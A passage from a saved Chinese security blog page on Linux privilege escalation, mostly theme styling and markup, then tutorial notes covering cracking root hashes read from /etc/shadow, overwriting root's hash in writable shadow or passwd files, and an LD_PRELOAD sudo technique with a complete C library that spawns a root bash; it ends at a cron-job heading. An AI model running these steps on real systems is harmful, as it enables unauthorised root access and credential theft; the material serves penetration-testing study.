.woocommerce-loop-product__title, .woocommerce ul.products li.product h3, .woocommerce div.product .product_title, .woocommerce .woocommerce-tabs h2 { font-family: Muli; } .woocommerce ul.products li.product .woocommerce-loop-category__title, .woocommerce ul.products li.product .woocommerce-loop-product__title, .woocommerce ul.products li.product h3, .woocommerce .star-rating { color: #0F8B8D; } .woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button, .woocommerce input.button { background-color: #E9B44C; color: #ffffff; line-height: 1.8; } .woocommerce #respond input#submit:hover, .woocommerce a.button:hover, .woocommerce button.button:hover, .woocommerce input.button:hover { background-color: #0f8b8d; color: #ffffff; } .woocommerce-page #respond input#submit.alt, .woocommerce a.button.alt, .woocommerce-page button.button.alt, .woocommerce input.button.alt { color: #E9B44C; line-height: 1.8; } .woocommerce-page #respond input#submit.alt::after, .woocommerce a.button.alt::after, .woocommerce-page button.button.alt::after, .woocommerce input.button.alt::after { content: ""; position: absolute; left: 0; top: 0; width: 100%; height: 100%; outline: 2px solid; -webkit-transition: .3s ease all; transition: .3s ease all; } .woocommerce-page #respond input#submit.alt:hover::after, .woocommerce a.button.alt:hover::after, .woocommerce-page button.button.alt:hover::after, .woocommerce input.button.alt:hover::after { opacity: 0; -webkit-transform: scale(1.2, 1.4); transform: scale(1.2, 1.4); } .woocommerce-page #respond input#submit.alt:hover, .woocommerce a.button.alt:hover, .woocommerce-page button.button.alt:hover, .woocommerce input.button.alt:hover { color: #0F8B8D; } .woocommerce div.product .woocommerce-tabs ul.tabs li.active { border-bottom-color: #ffffff; } .woocommerce #respond input#submit.alt.disabled, .woocommerce #respond input#submit.alt.disabled:hover, .woocommerce #respond input#submit.alt:disabled, .woocommerce #respond input#submit.alt:disabled:hover, .woocommerce #respond input#submit.alt[disabled]:disabled, .woocommerce #respond input#submit.alt[disabled]:disabled:hover, .woocommerce a.button.alt.disabled, .woocommerce a.button.alt.disabled:hover, .woocommerce a.button.alt:disabled, .woocommerce a.button.alt:disabled:hover, .woocommerce a.button.alt[disabled]:disabled, .woocommerce a.button.alt[disabled]:disabled:hover, .woocommerce button.button.alt.disabled, .woocommerce button.button.alt.disabled:hover, .woocommerce button.button.alt:disabled, .woocommerce button.button.alt:disabled:hover, .woocommerce button.button.alt[disabled]:disabled, .woocommerce button.button.alt[disabled]:disabled:hover, .woocommerce input.button.alt.disabled, .woocommerce input.button.alt.disabled:hover, .woocommerce input.button.alt:disabled, .woocommerce input.button.alt:disabled:hover, .woocommerce input.button.alt[disabled]:disabled, .woocommerce input.button.alt[disabled]:disabled:hover { background-color: #0F8B8D; color: #fff; } .woocommerce div.product .product_title, .woocommerce ul.products li.product .price, .woocommerce div.product p.price, .woocommerce div.product span.price { color: #0f8b8d} .woocommerce .quantity .qty { background-color: #eeeeee; } .woocommerce-checkout #payment { background: #f5f5f5; } .woocommerce .widget_price_filter .ui-slider .ui-slider-handle { background: #0f8b8d; } .woocommerce div.product .products > h2, .woocommerce .cart-collaterals h2 { font-family: Playfair Display; font-size: 1.2em; font-weight: 700; line-height: 2; ; } .woocommerce div.product .products > h2::after, .woocommerce .cart-collaterals h2::after { background-color: #E9B44C ; } .main .entry-content, .main .entry-summary { text-align: inherit; } .main p, .main ul, .main ol, .main dd, .main pre, .main hr { margin-bottom: 1em; } .main .entry-content p { text-indent: 0em; } .main a.post-featured-image { background-position: center top; } #header-widget-area { width: 33%; left: 10px; } .bravada-striped-table .main thead th, .bravada-bordered-table .main thead th, .bravada-striped-table .main td, .bravada-striped-table .main th, .bravada-bordered-table .main th, .bravada-bordered-table .main td { border-color: #e9e9e9; } .bravada-clean-table .main th, .bravada-striped-table .main tr:nth-child(even) td, .bravada-striped-table .main tr:nth-child(even) th { background-color: #f8f8f8; } .bravada-cropped-featured .main .post-thumbnail-container { height: 600px; } .bravada-responsive-featured .main .post-thumbnail-container { max-height: 600px; height: auto; } article.hentry .article-inner, #content-masonry article.hentry .article-inner { padding: 0%; } .site-header-bottom { height:70px; } .site-header-bottom .site-header-inside { height:70px; } .menu-search-animated, .menu-burger, #sheader-container, .identity, #nav-toggle { height: 70px; line-height: 70px; } #access div > ul > li > a, #access ul li[class*="icon"]::before { line-height:70px; } nav#mobile-menu { padding-top: 80px; } body.admin-bar nav#mobile-menu { padding-top: 112px; } #branding { height: 70px; } .bravada-responsive-headerimage #masthead #header-image-main-inside { max-height: 1020px; } .bravada-cropped-headerimage #masthead #header-image-main-inside { height: 1020px; } #site-description { display: block; } #header-widget-area { top: 80px; } .bravada-landing-page .lp-blocks-inside, .bravada-landing-page .lp-boxes-inside, .bravada-landing-page .lp-text-inside, .bravada-landing-page .lp-posts-inside, .bravada-landing-page .lp-page-inside, .bravada-landing-page .lp-section-header, .bravada-landing-page .content-widget { max-width: 1920px; } @media (min-width: 960px) { .bravada-landing-page .lp-blocks.lp-blocks1 .lp-blocks-inside { max-width: calc(1920px - 5em); background-color: #ffffff; } } #header-page-title #header-page-title-inside, .lp-staticslider .staticslider-caption, .seriousslider.seriousslider-theme .seriousslider-caption { max-width: 1920px; max-width: 85%; padding-top: 80px; } @media (max-width: 1024px) { #header-page-title #header-page-title-inside, .lp-staticslider .staticslider-caption, .seriousslider.seriousslider-theme .seriousslider-caption { max-width: 100%; } } .bravada-landing-page .content-widget { margin: 0 auto; } a.staticslider-button, .seriousslider-theme .seriousslider-caption-buttons a { background-color: #E9B44C; } a.staticslider-button:hover, .seriousslider-theme .seriousslider-caption-buttons a:hover { background-color: #0F8B8D; } .widget-title, #comments-title, #reply-title, .related-posts .related-main-title, .main .page-title, #nav-below em, .lp-text .lp-text-title, .lp-boxes-animated .lp-box-title, .entry-content h2, .entry-content h4 { background-image: linear-gradient(to bottom, rgba(233,180,76,0.4) 0%, rgba(233,180,76,0.4) 100%); } .entry-content h3 { background-image: linear-gradient(to bottom, rgba(15,139,141,0.4) 0%, rgba(15,139,141,0.4) 100%); } .entry-content h2, .entry-content h3, .entry-content h4 { background-repeat: no-repeat; background-position: 0 100%; background-size: 100% .4em; max-width: max-content; } .lp-blocks { background-color: #f9f7f5; } .lp-boxes { background-color: #F8F8F8; } .lp-boxes .lp-boxes-inside::before { background-color: #E9B44C ; } .lp-boxes ~ .lp-boxes .lp-boxes-inside::before { background-color: #0F8B8D ; } .lp-boxes ~ .lp-boxes ~ .lp-boxes .lp-boxes-inside::before { background-color: #E9B44C ; } .lp-text { background-color: #EEEBE9; } #lp-posts, #lp-page { background-color: #f3f7f6; } .lp-block { background-color: #ffffff; } .lp-block i[class^="blicon"]::before { color: #0F8B8D; } .lp-block .lp-block-title, .lp-text .lp-text-title { color: #162521; } .lp-block .lp-block-title::after { background-color: #E9B44C; } .lp-blocks1 .lp-block i[class^="blicon"] +i[class^="blicon"]::before { color: #0F8B8D; } .lp-block-readmore { color: #c0c0c0; } .lp-block-readmore:hover { color: #E9B44C; } .lp-text-title { color: #0F8B8D; } .lp-text-inside .lp-text-background { background-color: #ffffff; } .lp-boxes .lp-box { background-color: #ffffff; } .lp-boxes-animated .box-overlay { background-color: #0F8B8D; } .lp-boxes-animated .lp-box-readmore { color: #E9B44C; } .lp-boxes-static .box-overlay { background-color: #E9B44C; } .lp-box-title { color: #162521; } .lp-box-title:hover { color: #E9B44C; } .lp-boxes-1 .lp-box .lp-box-image { height: 250px; } #cryout_ajax_more_trigger, .lp-port-readmore { color: #0F8B8D; } .lpbox-rnd1 { background-color: #c1c1c1; } .lpbox-rnd2 { background-color: #bcbcbc; } .lpbox-rnd3 { background-color: #b7b7b7; } .lpbox-rnd4 { background-color: #b2b2b2; } .lpbox-rnd5 { background-color: #adadad; } .lpbox-rnd6 { background-color: #a8a8a8; } .lpbox-rnd7 { background-color: #a3a3a3; } .lpbox-rnd8 { background-color: #9e9e9e; } 
+</style>
+<link rel="stylesheet" id="slb_core-css" href="./linux提权 – why403_files/app.css" media="all">
+<link rel="stylesheet" id="cryout-serious-slider-style-css" href="./linux提权 – why403_files/style(1).css" media="all">
+<script src="./linux提权 – why403_files/jquery.min.js.下载" id="jquery-core-js"></script>
+<script src="./linux提权 – why403_files/jquery-migrate.min.js.下载" id="jquery-migrate-js"></script>
+<!--[if lt IE 9]>
+<script src="https://www.why403.cn/wp-content/themes/bravada/resources/js/html5shiv.min.js?ver=1.1.1" id="bravada-html5shiv-js"></script>
+<![endif]-->
+<script src="./linux提权 – why403_files/jquery.mobile.custom.min.js.下载" id="cryout-serious-slider-jquerymobile-js"></script>
+<script src="./linux提权 – why403_files/slider.js.下载" id="cryout-serious-slider-script-js"></script>
+<link rel="https://api.w.org/" href="https://www.why403.cn/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://www.why403.cn/wp-json/wp/v2/posts/1316"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.why403.cn/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.6.2">
+<link rel="canonical" href="https://www.why403.cn/archives/1316">
+<link rel="shortlink" href="https://www.why403.cn/?p=1316">
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.why403.cn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.why403.cn%2Farchives%2F1316">
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.why403.cn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.why403.cn%2Farchives%2F1316&amp;format=xml">
+<link rel="author" href="https://www.why403.cn/"><meta name="generator" content="Elementor 3.20.3; features: e_optimized_assets_loading, e_optimized_css_loading, e_font_icon_svg, additional_custom_breakpoints, block_editor_assets_optimize, e_image_loading_optimization; settings: css_print_method-external, google_font-enabled, font_display-swap">
+<noscript><style>.cryout .cryout-preloader {display: none;}.cryout img[loading="lazy"] {opacity: 1;}</style></noscript>
+<link rel="icon" href="https://www.why403.cn/wp-content/uploads/2023/06/cropped-APK-32x32.png" sizes="32x32">
+<link rel="icon" href="https://www.why403.cn/wp-content/uploads/2023/06/cropped-APK-192x192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="https://www.why403.cn/wp-content/uploads/2023/06/cropped-APK-180x180.png">
+<meta name="msapplication-TileImage" content="https://www.why403.cn/wp-content/uploads/2023/06/cropped-APK-270x270.png">
+<script src="./linux提权 – why403_files/wp-emoji-release.min.js.下载" defer=""></script><style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+
+<body class="post-template-default single single-post postid-1316 single-format-standard wp-embed-responsive bravada-image-none bravada-caption-zero bravada-totop-normal bravada-no-table bravada-over-menu bravada-menu-right bravada-topsection-normal bravada-responsive-headerimage bravada-fullscreen-headerimage bravada-responsive-featured bravada-magazine-three bravada-magazine-layout bravada-comment-placeholder bravada-comment-icons bravada-normalizedtags bravada-animated-title bravada-lazy-noanimation bravada-article-animation-fade elementor-default elementor-kit-1442" itemscope="" itemtype="http://schema.org/WebPage">
+			<a class="skip-link screen-reader-text" href="https://www.why403.cn/archives/1316#main" title="跳至内容"> 跳至内容 </a>
+			<div id="site-wrapper">
+
+	<header id="masthead" class="cryout" itemscope="" itemtype="http://schema.org/WPHeader">
+
+		<div id="site-header-main">
+
+			<div class="site-header-top">
+
+				<div class="site-header-inside">
+
+					<div id="header-menu" itemscope="" itemtype="http://schema.org/SiteNavigationElement">
+											</div><!-- #header-menu -->
+
+				</div><!-- #site-header-inside -->
+
+			</div><!--.site-header-top-->
+
+						<nav id="mobile-menu" tabindex="-1">
+				<div class="side-menu side-section"><ul id="mobile-nav" class=""><li class="menu-main-search" style="transition-delay: 0s;">
+<form role="search" method="get" class="searchform" action="https://www.why403.cn/">
+	<label>
+		<span class="screen-reader-text">搜索：</span>
+		<input type="search" class="s" placeholder="搜索" value="" name="s" size="10">
+	</label>
+	<button type="submit" class="searchsubmit" aria-label="搜索"><i class="icon-search2"></i><i class="icon-search2"></i></button>
+</form>
+</li><li id="menu-item-1413" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1413" style="transition-delay: 0.03s;"><a href="https://www.why403.cn/archives/category/web%e5%ae%89%e5%85%a8"><span>web安全</span></a></li>
+<li id="menu-item-1414" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1414" style="transition-delay: 0.06s;"><a href="https://www.why403.cn/archives/category/learning"><span>学习</span></a></li>
+<li id="menu-item-1416" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1416" style="transition-delay: 0.09s;"><a href="https://www.why403.cn/archives/category/learning/%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84"><span>数据结构</span></a></li>
+<li id="menu-item-1417" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1417" style="transition-delay: 0.12s;"><a href="https://www.why403.cn/archives/category/learning/%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%bd%91%e7%bb%9c"><span>计算机网络</span></a></li>
+<li id="menu-item-1418" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1418" style="transition-delay: 0.15s;"><a href="https://www.why403.cn/archives/category/learning/python"><span>python</span></a></li>
+<li id="menu-item-1419" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1419" style="transition-delay: 0.18s;"><a href="https://www.why403.cn/archives/category/photography"><span>摄影</span></a></li>
+<li id="menu-item-1420" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1420" style="transition-delay: 0.21s;"><a href="https://www.why403.cn/archives/category/learning/c-c"><span>c/c++</span></a></li>
+<li id="menu-item-1421" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1421" style="transition-delay: 0.24s;"><a href="https://www.why403.cn/archives/category/learning/linux"><span>Linux</span></a></li>
+<li id="menu-item-1422" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1422" style="transition-delay: 0.27s;"><a href="https://www.why403.cn/archives/category/%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80"><span>系统基础</span></a></li>
+<li id="menu-item-1423" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1423" style="transition-delay: 0.3s;"><a href="https://www.why403.cn/archives/category/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f"><span>内网渗透</span></a></li>
+</ul></div>					<div class="side-socials side-section">
+		<div class="widget-side-section-inner">
+			<section class="side-section-element widget_cryout_socials">
+				<div class="widget-socials">
+									</div>
+			</section>
+		</div>
+	</div>			</nav> <!-- #mobile-menu -->
+			
+			<div class="site-header-bottom">
+
+				<div class="site-header-bottom-fixed">
+
+					<div class="site-header-inside">
+
+						<div id="branding">
+							<div id="site-text"><div itemprop="headline" id="site-title"><span> <a href="https://www.why403.cn/" title="Hello,welcome to Vagary&#39;s website." rel="home">why403</a> </span></div><span id="site-description" itemprop="description">Hello,welcome to Vagary's website.</span></div>						</div><!-- #branding -->
+
+												<div class="menu-burger">
+							<button class="hamburger" type="button" aria-label="Main menu">
+									<span></span>
+									<span></span>
+									<span></span>
+							</button>
+						</div>
+						
+												<nav id="access" aria-label="顶部菜单" itemscope="" itemtype="http://schema.org/SiteNavigationElement">
+							<div><ul id="top-nav" class=""><li id="menu-item-1402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1402"><a href="https://www.why403.cn/"><span>首页</span></a></li>
+<li id="menu-item-1401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1401"><a href="https://doc.why403.cn/"><span>webscan</span></a></li>
+<li id="menu-item-1411" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1411"><a href="https://www.why403.cn/archives/category/web%e5%ae%89%e5%85%a8"><span>web安全</span></a></li>
+<li id="menu-item-1448" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1448"><a href="https://www.why403.cn/%e5%9b%be%e5%ba%93"><span>摄影</span></a></li>
+</ul></div>						</nav><!-- #access -->
+						
+					</div><!-- #site-header-inside -->
+
+				</div><!-- #site-header-bottom-fixed -->
+
+			</div><!--.site-header-bottom-->
+
+		</div><!-- #site-header-main -->
+
+		<div id="header-image-main">
+			<div id="header-image-main-inside">
+					<a href="https://www.why403.cn/archives/1316#main" class="meta-arrow" tabindex="-1">
+			<i class="icon-arrow" title="阅读更多"></i>
+	</a>
+			<div id="header-overlay" style="opacity: 1.17;"></div>
+			<div class="header-image" style="background-image: url(https://www.why403.cn/wp-content/uploads/2023/10/cropped-12777-2441869984-masterpiece_masterpiec-scaled-1.jpg)"></div>
+			<img class="header-image" alt="linux提权" src="./linux提权 – why403_files/cropped-12777-2441869984-masterpiece_masterpiec-scaled-1.jpg" style="opacity: 1; background-position: center 145%;">
+				    <div id="header-page-title" class="" style="opacity: 0.05;">
+        <div id="header-page-title-inside">
+						<div class="entry-meta pretitle-meta">
+							</div><!-- .entry-meta -->
+            <div class="entry-title"><em class="caption-title-word"><span><span class="cry-single animated-letter" style="animation-delay: 0ms;">l</span><span class="cry-double animated-letter" style="animation-delay: 0ms;">l</span></span><span><span class="cry-single" style="animation-delay: 0s;">i</span><span class="cry-double" style="animation-delay: 0s;">i</span></span><span><span class="cry-single" style="animation-delay: 0s;">n</span><span class="cry-double" style="animation-delay: 0s;">n</span></span><span><span class="cry-single animated-letter" style="animation-delay: 0ms;">u</span><span class="cry-double animated-letter" style="animation-delay: 0ms;">u</span></span><span><span class="cry-single" style="animation-delay: 0s;">x</span><span class="cry-double" style="animation-delay: 0s;">x</span></span><span><span class="cry-single" style="animation-delay: 0s;">提</span><span class="cry-double" style="animation-delay: 0s;">提</span></span><span><span class="cry-single" style="animation-delay: 0s;">权</span><span class="cry-double" style="animation-delay: 0s;">权</span></span></em></div>			<div class="entry-meta aftertitle-meta">
+				
+		<span class="onDate date">
+				<i class="icon-date icon-metas" title="日期"></i>
+				<time class="published" datetime="2023-12-13T23:04:54+08:00" itemprop="datePublished">
+					2023-12-13				</time>
+				<time class="updated" datetime="2024-02-27T17:06:41+08:00" itemprop="dateModified">2024-02-27</time>
+		</span>
+		<div class="author-container"><span class="author vcard" itemscope="" itemtype="http://schema.org/Person" itemprop="author"><a class="url fn n" rel="author" href="https://www.why403.cn/archives/author/vagary" title="查看该作者所有文章 vagary" itemprop="url">
+					<span class="author-avatar"><img width="96" height="96" src="./linux提权 – why403_files/cropped-QQ图片20230622220002-1-150x150.jpg" class="avatar avatar-96 photo" alt="" decoding="async" srcset="https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-150x150.jpg 150w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-300x300.jpg 300w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-281x281.jpg 281w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-270x270.jpg 270w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-192x192.jpg 192w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-180x180.jpg 180w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-32x32.jpg 32w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1.jpg 512w" sizes="(max-width: 96px) 100vw, 96px"></span>
+					<em itemprop="name">vagary</em></a></span></div>				<div id="breadcrumbs-container" class="cryout three-columns-sided"><div id="breadcrumbs-container-inside"><div id="breadcrumbs"> <nav id="breadcrumbs-nav"><a href="https://www.why403.cn/" title="首页"><i class="icon-bread-home"></i><span class="screen-reader-text">首页</span></a> <a href="https://www.why403.cn/archives/category/web%e5%ae%89%e5%85%a8">web安全</a>  <span class="current">linux提权</span></nav></div></div></div><!-- breadcrumbs -->			</div><!-- .entry-meta -->
+			<div class="byline">
+							</div>
+        </div>
+    </div> 			</div><!-- #header-image-main-inside -->
+		</div><!-- #header-image-main -->
+
+	</header><!-- #masthead -->
+
+	
+	<div id="content" class="cryout">
+		
+<div id="container" class="three-columns-sided">
+	<main id="main" class="main">
+		
+		
+			<article id="post-1316" class="post-1316 post type-post status-publish format-standard hentry category-web category-72 category-learning category-33 tag-linux tag-71 tag-70" itemscope="" itemtype="http://schema.org/Article" itemprop="mainEntity">
+				<div class="schema-image">
+							<div class="entry-meta">
+					</div>
+						</div>
+
+				<div class="article-inner">
+					<header>
+						<div class="entry-meta beforetitle-meta">
+													</div><!-- .entry-meta -->
+						<h1 class="entry-title singular-title" itemprop="headline">linux提权</h1>
+						<div class="entry-meta aftertitle-meta">
+							<div class="author-container"><span class="author vcard" itemscope="" itemtype="http://schema.org/Person" itemprop="author"><a class="url fn n" rel="author" href="https://www.why403.cn/archives/author/vagary" title="查看该作者所有文章 vagary" itemprop="url">
+					<span class="author-avatar"><img width="96" height="96" src="./linux提权 – why403_files/cropped-QQ图片20230622220002-1-150x150.jpg" class="avatar avatar-96 photo" alt="" decoding="async" srcset="https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-150x150.jpg 150w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-300x300.jpg 300w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-281x281.jpg 281w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-270x270.jpg 270w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-192x192.jpg 192w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-180x180.jpg 180w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1-32x32.jpg 32w, https://www.why403.cn/wp-content/uploads/2023/06/cropped-QQ图片20230622220002-1.jpg 512w" sizes="(max-width: 96px) 100vw, 96px"></span>
+					<em itemprop="name">vagary</em></a></span></div>
+		<span class="onDate date">
+				<i class="icon-date icon-metas" title="日期"></i>
+				<time class="published" datetime="2023-12-13T23:04:54+08:00" itemprop="datePublished">
+					2023-12-13				</time>
+				<time class="updated" datetime="2024-02-27T17:06:41+08:00" itemprop="dateModified">2024-02-27</time>
+		</span>
+								</div><!-- .entry-meta -->
+
+					</header>
+
+					
+					<div class="entry-content" itemprop="articleBody">
+						
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-4 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color"><strong>整理内容来源于红队笔记</strong></mark></h2>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-3 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading">linux可读shadow利用</h2>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-2 wp-block-group-is-layout-flex">
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">ls -liah /etc/shadow</mark>查看/etc/shadow信息</p>
+
+
+
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-1 wp-block-group-is-layout-flex">
+<p>这是在Linux系统中使用ls命令查看/etc/shadow文件的详细信息，包括文件权限、所有者、大小、创建日期等。</p>
+
+
+
+<p>具体来说，这个命令使用了以下参数：</p>
+
+
+
+<ul class="wp-block-list">
+<li>-l：指示ls命令输出详细信息，包括文件权限、所有者、大小、创建日期等。</li>
+
+
+
+<li>-i：指示ls命令输出文件的inode号码。</li>
+
+
+
+<li>-a：指示ls命令输出所有文件，包括隐藏文件。</li>
+
+
+
+<li>-h：指示ls命令以人类可读的方式输出文件大小。</li>
+</ul>
+</div>
+</div>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">cat /etc/shadow</mark> 查看/etc/shadow内容<br>查看后可以尝试爆破root用户的hash<br>hash爆破<br><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">cat /etc/shadow | grep “:/$” &gt; hash.txt</mark><br>然后传入kali本地用john爆破hash<br><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">john wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt</mark></p>
+</div>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-5 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading">linux可写shadow利用</h2>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">mkpasswd -m sha-512 [passwd]</mark>     生成hash值<br>vim /etc/shadow<br>把root的hash值修改成生成的hash<br>这样就可以利用我们设置的密码登录root了</p>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-6 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading">linux可写passwd利用</h2>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">openssl passwd [passwd]</mark> 生成hash值也可以用上面的<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">mkpasswd</mark>生成<br>vim /etc/passwd<br>把root的密码改成hash就可以登录root用户了</p>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-10 wp-block-group-is-layout-flex">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
+<h2 class="wp-block-heading">Linux提权sudo环境变量提权</h2>
+
+
+
+<h3 class="wp-block-heading"><strong>前提：</strong></h3>
+
+
+
+<p><strong>1.sudo环境变量具有env_keep +=LD_PRELOAD或者类似把预加载共享库加载到环境变量<br>2.具有可以不用root就能使用root权限执行的命令</strong></p>
+
+
+
+<h3 class="wp-block-heading"><br>提权逻辑：</h3>
+
+
+
+<p><strong>在自定义的共享库调用root身份的bash,但是一般权限的共享库没法调用root权限bash，如果有普通用户就可以使用root权限执行的命令加载这个共享库，那么就可以在共享库初始时执行root权限的bash。</strong><br><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">相当于共享库借用权限执行bash</mark></strong></p>
+
+
+
+<p></p>
+
+
+
+<p>编写共享库：</p>
+
+
+
+<pre class="wp-block-code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+
+//共享库初始化函数，在共享库时就会调用
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+</code></pre>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-8 wp-block-group-is-layout-flex">
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</mark> 编译共享库</p>
+
+
+
+<div class="wp-block-group has-very-light-gray-to-cyan-bluish-gray-gradient-background has-background is-vertical is-layout-flex wp-container-core-group-is-layout-7 wp-block-group-is-layout-flex">
+<p>解释：</p>
+
+
+
+<p>这是在Linux系统中使用gcc编译器编译一个名为shell.so的共享库文件shell.c，并输出结果到shell.so文件中。</p>
+
+
+
+<p>具体来说，这个命令使用了以下参数：</p>
+
+
+
+<ul class="wp-block-list">
+<li>-fPIC：指示gcc编译器生成位置无关的代码，以便共享库可以在不同的内存位置加载。</li>
+
+
+
+<li>-shared：指示gcc编译器生成一个共享库文件。</li>
+
+
+
+<li>-o：指定输出文件的名称为shell.so。</li>
+
+
+
+<li>-nostartfiles：指示gcc编译器不使用标准的启动文件，以便生成一个更小的共享库文件。</li>
+</ul>
+
+
+
+<p>shell.c是一个C语言源代码文件，它包含一个名为shell的函数。这个函数会在共享库加载时自动执行，并调用system函数来执行一个shell命令。</p>
+
+
+
+<p>通过编译这个共享库文件，我们可以将它加载到其他程序中，以便在运行时执行shell命令。需要注意的是，这个共享库文件可以被滥用，因为它可以让任何程序以超级用户权限执行任意的shell命令，因此应该谨慎使用。</p>
+</div>
+
+
+
+<p></p>
+
+
+
+<h3 class="wp-block-heading">提权：</h3>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">sudo LD_PRELOAD=[共享库路径] find</mark></p>
+
+
+
+<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="989" height="650" src="./linux提权 – why403_files/image-5.png" alt="" class="wp-image-1325" srcset="https://www.why403.cn/wp-content/uploads/2023/12/image-5.png 989w, https://www.why403.cn/wp-content/uploads/2023/12/image-5-300x197.png 300w, https://www.why403.cn/wp-content/uploads/2023/12/image-5-768x505.png 768w, https://www.why403.cn/wp-content/uploads/2023/12/image-5-443x291.png 443w" sizes="(max-width: 989px) 100vw, 989px"></figure>
+</div>
+
+
+
+<p><strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">整个过程中相当于共享库借用find的root权限执行了bash</mark></strong></p>
+</div></div>
+</div>
+
+
+
+<div class="wp-block-group is-vertical is-layout-flex wp-container-core-group-is-layout-17 wp-block-group-is-layout-flex">
+<h2 class="wp-block-heading">Linux自动任务文件权限提权</h2>
+
+
+
+<h3 class="wp-block-heading">原理：</h3>
+
+
+
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-accent-1-color">利用自动任务中root权限执行的bash带有root权限</mark></p>
+
+
+
+<h3 class="wp-block-heading">发现利用点：</h3>
+
+
+
